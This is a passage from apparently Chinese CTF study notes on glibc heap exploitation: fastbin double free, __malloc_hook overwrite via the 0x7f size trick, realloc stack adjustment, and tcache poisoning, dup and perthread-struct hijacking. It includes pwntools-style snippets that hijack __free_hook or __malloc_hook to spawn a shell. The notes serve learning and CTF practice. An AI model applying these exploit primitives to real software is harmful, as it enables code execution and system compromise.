</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span></span></span></code></pre></div></div><h3 id=fast-bin-attack>fast bin attack</h3><h4 id=double-free>Double Free</h4><p><strong>条件</strong></p><ul><li><p>glibc-2.23，且存在 UAF 漏洞：堆上某块内存被释放后，未将指向该堆块的指针清零，对该内存进行再次 free，达成任意地址写</p></li><li><p>free 掉 chunk 时，判断 chunk 大小和所处位置，若 chunk_size &lt;= max_fast 且 chunk 不位于 heap 的顶部（即不与 top chunk 相邻），则将 chunk 放到 fast bins 中</p></li></ul><p><strong>绕过</strong></p><ul><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// 直接连续两次free _int_free 会检测出double free
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span><span class=p>(</span><span class=n>old</span> <span class=o>==</span> <span class=n>p</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span></span></span></code></pre></div></div><p>其只检查链表中第一个 chunk 是否是待释放 chunk，所以先释放 chunk2 再释放 chunk1 绕过</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span><span class=p>(</span><span class=nf>fastbin_index</span><span class=p>(</span><span class=nf>chunksize</span><span class=p>(</span><span class=n>victim</span><span class=p>))</span> <span class=o>!=</span> <span class=n>idx</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span></span></span></code></pre></div></div><p><strong>要保证申请 target chunk 位置对应 size 字段的值正确</strong></p></li></ul><p><strong>利用</strong></p><ul><li>申请 2 个 0x60 的堆块【1,2】进行如下操作：</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># 均进入 fast bins</span></span></span></code></pre></div></div><ul><li><p>调用 malloc 返回 chunk1 ，修改 chunk1 内容来修改其 fd 指针指向恶意地址（如 malloc_hook 偏移地址）</p></li><li><p>在第四次 malloc 可实现在任意地址分配 fastbin 块，后续利用<code>Arbitrary Alloc</code>劫持 malloc_hook 为 one_gadget</p></li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241125141220909.png alt=图片无法加载><h4 id=arbitrary-alloc>Arbitrary Alloc</h4><p><strong>条件</strong></p><ul><li>劫持 fastbin 中 chunk 的<strong>fd</strong>指针指向伪造的 fake_chunk，最终覆盖<code>malloc_hook</code>地址为<code>one_gadget</code>，然后执行 malloc 劫持获得 shell</li><li>需要 UAF 或堆溢出使得可以对 free 的堆块编辑更改 fd 指针</li></ul><p><strong>利用</strong></p><ol><li>申请 0123 四个堆块，释放 2 到 fastbin，然后申请 4 来堆叠 2 和 4chunk，用 4 填写入 fd 为 fake chunk 地址，size 最后一位须设置为 1</li><li>申请一次为 2，申请第二次为 fakechunk，即可以在 fakechunk 处任意读写，fakechunk 可以为 malloc-0x23 等相关地址</li><li>若可以在 uaf 后直接编写 free 后的 chunk 也可以不堆叠，申请 01 两个堆块，释放 0 修改 0 的 fd，最终申请两次</li></ol><p><strong>绕过检查</strong>：</p><ol><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
</span></span></span><span class=line><span class=cl><span class=cp>#define chunksize(p) ((p)-&gt;size &amp; ~(SIZE_BITS)) </span><span class=c1>// 将最后三位置0
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define fastbin_index(sz) ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2) </span><span class=c1>// 右移4位即低4位无用
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=n>idx</span> <span class=o>=</span> <span class=nf>fastbin_index</span><span class=p>(</span><span class=n>nb</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span><span class=p>(</span><span class=nf>fastbin_index</span><span class=p>(</span><span class=nf>chunksize</span><span class=p>(</span><span class=n>victim</span><span class=p>))</span> <span class=o>!=</span> <span class=n>idx</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span> <span class=c1>// 该比较使得0x7f与0x70右移4位后效果一致
</span></span></span></code></pre></div></div><p>size 不考虑低 3 比特，且 libc 或栈地址多为 0x7f 开头，因此可通过截取 0x7f 用 0x70 的 fastbin 将内存申请出来</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>do_check_remalloced_chunk</span><span class=p>(</span><span class=n>mstate</span> <span class=n>av</span><span class=p>,</span> <span class=n>mchunkptr</span> <span class=n>p</span><span class=p>,</span> <span class=n>INTERNAL_SIZE_T</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>INTERNAL_SIZE_T</span> <span class=n>sz</span> <span class=o>=</span> <span class=nf>chunksize_nomask</span><span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=o>&amp;</span> <span class=o>~</span><span class=p>(</span><span class=n>PREV_INUSE</span> <span class=o>|</span> <span class=n>NON_MAIN_ARENA</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nf>chunk_is_mmapped</span><span class=p>(</span><span class=n>p</span><span class=p>))</span> <span class=c1>// p 为 1 绕过检查
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>assert</span> <span class=p>(</span><span class=n>av</span> <span class=o>==</span> <span class=nf>arena_for_chunk</span><span class=p>(</span><span class=n>p</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nf>chunk_main_arena</span><span class=p>(</span><span class=n>p</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=nf>assert</span><span class=p>(</span><span class=n>av</span> <span class=o>==</span> <span class=o>&amp;</span><span class=n>main_arena</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span>
</span></span><span class=line><span class=cl>            <span class=nf>assert</span><span class=p>(</span><span class=n>av</span> <span class=o>!=</span> <span class=o>&amp;</span><span class=n>main_arena</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>do_check_inuse_chunk</span><span class=p>(</span><span class=n>av</span><span class=p>,</span> <span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p><code>size</code>位需要<code>0xnf</code>(111)而非<code>0xn1</code>(001)</p></li></ol><ul><li><strong>字节错位</strong>，64 位程序中 fastbin 范围【0x20-0x80】，此时<code>0x7f403c467aed</code>的地址（__malloc_hook - 0x23）后的<code>0x000000000000007f</code>错位出了合理<code>chunk</code>中的<code>size</code>域，修改 fastbin 的 fd 指针指向该地址</li><li><code>0x7f</code>在计算 fastbin index 时，属于 chunk 大小为 0x70 的，而 chunk 又包含了 0x10 的 header，因此选择 malloc 构造时选择分配 0x60 或 0x68 的 fastbin，申请 2 次 0x60 或 0x68 的 fake chunk 实现对<code>__realloc_hook</code>和<code>__malloc_hook</code>的控制</li></ul><p><code>gdb</code>调用具体细节</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>x</span><span class=o>/</span><span class=mi>20</span><span class=n>gx</span> <span class=mh>0x7f403c467b10</span> <span class=o>-</span> <span class=mh>0x23</span>
</span></span><span class=line><span class=cl><span class=mh>0x7f403c467aed</span> <span class=o>&lt;</span><span class=n>_IO_wide_data_0</span><span class=o>+</span><span class=mi>301</span><span class=o>&gt;:</span>        <span class=mh>0x403c466260000000</span>        <span class=mh>0x000000000000007f</span>
</span></span><span class=line><span class=cl><span class=mh>0x7f403c467afd</span><span class=o>:</span>                              <span class=mh>0x403c128ea0000000</span>        <span class=mh>0x403c128a7000007f</span>
</span></span><span class=line><span class=cl><span class=mh>0x7f403c467b0d</span> <span class=o>&lt;</span><span class=n>__realloc_hook</span><span class=o>+</span><span class=mi>5</span><span class=o>&gt;:</span>           <span class=mh>0x000000000000007f</span>        <span class=mh>0x0000000000000000</span>
</span></span><span class=line><span class=cl>                       <span class=nl>malloc_hook</span><span class=p>:</span>             <span class=mi>4</span> <span class=mi>3</span> <span class=mi>2</span> <span class=mi>1</span> <span class=mi>0</span> <span class=n>f</span> <span class=n>e</span> <span class=n>d</span>           <span class=n>c</span> <span class=n>b</span> <span class=n>a</span> <span class=mi>9</span> <span class=mi>8</span> <span class=mi>7</span> <span class=mi>6</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl><span class=mh>0x7f403c467b1d</span><span class=o>:</span>                              <span class=mh>0x0000000000000000</span>        <span class=mh>0x0000000000000000</span>
</span></span><span class=line><span class=cl><span class=mh>0x7f403c467b2d</span> <span class=o>&lt;</span><span class=n>main_arena</span><span class=o>+</span><span class=mi>13</span><span class=o>&gt;:</span>              <span class=mh>0x828a2b80c0000000</span>        <span class=mh>0x403c467aed000055</span>
</span></span><span class=line><span class=cl><span class=mh>0x7f403c467b3d</span> <span class=o>&lt;</span><span class=n>main_arena</span><span class=o>+</span><span class=mi>29</span><span class=o>&gt;:</span>              <span class=mh>0x000000000000007f</span>        <span class=mh>0x0000000000000000</span>
</span></span><span class=line><span class=cl><span class=mh>0x7f403c467b4d</span> <span class=o>&lt;</span><span class=n>main_arena</span><span class=o>+</span><span class=mi>45</span><span class=o>&gt;:</span>              <span class=mh>0x0000000000000000</span>        <span class=mh>0x0000000000000000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>x</span><span class=o>/</span><span class=n>gx</span> <span class=mh>0x7f403c467b10</span>
</span></span><span class=line><span class=cl><span class=mh>0x7f403c467b10</span> <span class=o>&lt;</span><span class=n>__malloc_hook</span><span class=o>&gt;:</span>        <span class=mh>0x0000000000000000</span>
</span></span><span class=line><span class=cl><span class=c1>//想要劫持的 __malloc_hook 地址
</span></span></span></code></pre></div></div><p>劫持<code>__malloc_hook</code>构造的 payload 填入的位置为【malloc_hook 地址 - 0x23 + 0x10】或者【malloc_hook 地址 - 0x23】，即修改 fd 指向该位置，data 进入的位置是在<code>prev_size</code>和<code>size</code>域后面的，一般直接填入<code>b"a" * 0x13 + p64(one_gadget)</code>，0x13 为需要的 padding</p><img src=/img/pwn_note.zh-cn.assets/image-20241125005030065.png alt=图片无法加载><p><strong>realloc 劫持</strong></p><ul><li>存在 one_gadget 有条件的情况需要使用<strong>realloc，realloc 中有许多 push 操作以及调整 rsp 的操作</strong></li><li>如要求<code>[rsp+0x30]</code>必须为 NULL 或者是 0，通过 realloc 来调整栈帧，rsp 在栈上，通过 push 增加栈的高度</li></ul><img src=/img/pwn_note.zh-cn.assets/172844676894974.png alt=图片无法加载><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;a&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x13</span> <span class=o>-</span> <span class=mh>0x8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>one_gadget</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>realloc_addr</span> <span class=o>+</span> <span class=mh>0xc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># +0xc表示只进行一次push，即rsp+0x30-0x8(push)-0x38(sub)-0x8(call) = rsp-0x18上为一块值为0的内存单元</span></span></span></code></pre></div></div><ol><li><strong>malloc 发现 malloc_hook 不为空，调用 malloc_hook 里面的 realloc+0xc，执行 realloc 下面一系列 push 操作，调节栈帧满足 one_gadget 的条件</strong></li><li><strong>realloc 判断 realloc_hook 是否为空，不为空则执行 realloc_hook 指向的 one_gadget，获取 shell</strong></li></ol><p><strong>malloc 报错触发</strong></p><p>通过<code>double free</code>来触发 malloc 报错，其最后也会执行 malloc，此时栈结构也进行了改变，可能达成 one_gadget 条件</p><h3 id=tcache-bin-attack>Tcache bin attack</h3><ul><li><p>泄漏了堆地址，就可以调试计算偏移得到 <code>tcache_perthread_struct</code> 地址</p></li><li><p>泄漏 了 key，key 就是 <code>tcache_perthread_struct</code> 地址</p></li></ul><h4 id=tcache-bypass>Tcache Bypass</h4><p>让释放的 chunk 不进入 tcache bin</p><ul><li>释放不在 tcache 大小范围的 chunk</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x410</span><span class=p>)</span> <span class=c1># 0x400在tcache bin范围内</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete_chunk</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span></span></span></code></pre></div></div><ul><li>释放 7 个同样大小 chunk 进入 tcache 填满</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=n>xrange</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=n>_</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=n>xrange</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>delete_chunk</span><span class=p>(</span><span class=n>_</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete_chunk</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span></span></span></code></pre></div></div><ul><li>利用 UAF，<code>malloc(0x80)</code>，然后 7 次<code>free(0)</code>填充完<code>tcache bin</code>，每次 free(0)需要 edit(0)修改 fd 和 bk 为 0，否则 fd 将会是某堆块地址中数值，使得不可循环 free，再 free 进入<code>unsorted bin</code>泄露 libc 基址</li><li>限制 free 次数，通过<code>tcache dup</code>malloc 3 次将 counts 改为-1 绕过</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete_chunk</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete_chunk</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># double free 将 tcache bin中第一个chunk指向自身</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>)</span> <span class=c1># -1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete_chunk</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span></span></span></code></pre></div></div><ul><li>控制<code>tcache_perthread_struct</code>，控制<code>counts</code>实现绕过</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>p *<span class=o>(</span>struct tcache_perthread_struct*<span class=o>)</span> 0xaaaa</span></span></code></pre></div></div><h4 id=tcache-poisoning>Tcache Poisoning</h4><ul><li>覆盖 tcache 的 next 指针，无需伪造 chunk 结构，可实现 malloc 到任何地址</li><li>safe-linking 机制之前可使用</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete_chunk</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># 进入tcache</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit_chunk</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]))</span> <span class=c1># 改next指针为__free_hook</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>)</span> <span class=c1># 申请第一个chunk</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>)</span> <span class=c1># 申请__free_hook指向地址</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit_chunk</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>edit_chunk</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete_chunk</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># getshell</span></span></span></code></pre></div></div><ul><li>glibc-2.31 时根据 count 判断 tcache，所以开头需要多申请一次堆块保证 count>=1</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># 之后进行edit</span></span></span></code></pre></div></div><h4 id=tcache-dup>Tcache Dup</h4><ul><li>适用于 glibc-2.27，两次释放同一块 chunk，再 malloc，等效于 uaf，show 可以泄露地址，修改 next 指针可进行 tcache poisoning</li></ul><p><strong>泄露堆地址</strong></p><p>double free 后 tcache 中的唯一堆块指向自己，只要不修改 fd 指针，可以多次 malloc 均为该 chunk</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x50</span><span class=p>)</span> <span class=c1># chunk0</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># 泄露堆地址，通过偏移可获取tcache结构体基地址</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20241127233211910.png alt=图片无法加载><p><strong>控制 fd 指针</strong></p><blockquote><p><strong>__free_hook 劫持</strong></p></blockquote><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x50</span><span class=p>)</span> <span class=c1># chunk0</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x50</span><span class=p>)</span> <span class=c1># chunk0</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x50</span><span class=p>)</span> <span class=c1># 劫持__free_hook chunk</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># getshell</span></span></span></code></pre></div></div><blockquote><p><strong>tcache_perthread_struct 劫持</strong></p></blockquote><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mh>0x240</span><span class=p>)</span> <span class=c1># chunk0</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>))</span> <span class=c1># fd字段，高版本需要target异或值</span>
</span></span><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mh>0x240</span><span class=p>)</span> <span class=c1># chunk0</span>
</span></span><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mh>0x240</span><span class=p>)</span> <span class=c1># 劫持tcache结构体</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span> <span class=o>*</span> <span class=mi>64</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span> <span class=o>*</span> <span class=mi>64</span><span class=p>)</span> <span class=c1># 覆盖count 以及 tcache_entry, deadbeef改为target地址</span></span></span></code></pre></div></div><ul><li><p>再申请一个 chunk，为 chunk0，将 fd 覆盖为<code>tcache_perthread_struct</code>地址，接着两次 malloc 后，第二次 malloc 分配的堆块到<code>tcache_perthread_struct</code>结构体地址，可以控制该结构体</p></li><li><p>编辑 tcache 结构体中的 count 为极大值或 0x7，导致之后分配的 chunk 在 free 后因 tcache 判定满而不进入 tcache 达成绕过</p></li><li><p>也可<strong>将其所在的 0x251 大小的 chunk 释放到 unsorted bin</strong>，再次申请 0x240 大小的 chunk 修改 tcache 结构体</p></li></ul><blockquote><p><strong>__malloc_hook 劫持</strong></p></blockquote><ul><li>可以接着<strong>通过修改结构体中的<code>tcache_entry</code></strong>，其每隔 8 字节是一个指向 tcache bin 